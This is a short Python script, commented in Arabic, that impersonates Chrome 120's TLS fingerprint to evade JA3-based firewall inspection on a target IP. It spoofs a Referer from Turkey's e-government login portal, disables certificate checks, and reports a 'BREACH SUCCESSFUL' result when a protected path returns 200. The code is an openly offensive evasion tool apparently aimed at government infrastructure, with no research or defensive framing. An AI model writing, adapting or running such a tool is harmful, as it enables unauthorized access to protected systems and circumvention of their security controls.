from curl_cffi import requests
import json

class AbyssJA3Infiltrator:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        # نستخدم بصمة متصفح Chrome النسخة 120 لإيهام الـ JA3 Inspection
        self.impersonate = "chrome120"
        
    def final_bypass_attempt(self, path):
        url = f"https://{self.target_ip}{path}"
        print(f"[*] Impersonating Chrome 120 TLS to bypass JA3 on: {path}")
        
        try:
            # هنا يكمن السر: نرسل الطلب مع بصمة TLS كاملة للمتصفح
            response = requests.get(
                url,
                impersonate=self.impersonate,
                verify=False,
                timeout=15,
                headers={
                    "Accept-Language": "tr-TR,tr;q=0.9",
                    "Referer": "https://giris.turkiye.gov.tr/",
                }
            )
            
            print(f"[+] Actual Status Code: {response.status_code}")
            
            if response.status_code == 200:
                print(f"[!!!] BREACH SUCCESSFUL! Path: {path}")
                print(f"[*] Response Body Snippet: {response.text[:300]}")
            elif response.status_code == 403:
                print(f"[-] WAF bypassed JA3, but Access Denied (403). We need a valid Session/Token.")
            elif response.status_code == 406:
                print(f"[-] Still 406. Your WAF might be using 'Rate Limiting' or 'IP Reputation'.")
            else:
                print(f"[-] Unexpected Status: {response.status_code}")
                
        except Exception as e:
            print(f"[-] Error during impersonation: {e}")
